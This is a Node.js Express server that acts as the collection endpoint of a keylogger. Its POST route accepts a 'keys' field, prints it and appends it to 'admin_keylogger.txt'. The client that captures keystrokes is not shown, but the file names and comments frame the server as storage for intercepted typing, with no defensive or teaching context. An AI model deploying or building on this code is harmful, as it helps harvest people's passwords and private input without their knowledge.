const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();

app.use(bodyParser.urlencoded({ extended: false }));

// Route to handle POST request
app.post('/write-to-file', (req, res) => {
    const data = req.body.keys;
    console.log(`New entry:  ${data}`);
    
    // Writes input received into a text file called admin_keylogger.txt
    fs.appendFile('admin_keylogger.txt', data + '\n', (err) => {
        if (err) {
            return res.status(500).send('Failed to write to file');
        }
        res.send('Data written to file');
    });
});

app.listen(3001, () => { // Listen to requests on an open port 3001
    console.log('Server is running on localhost:3001');
});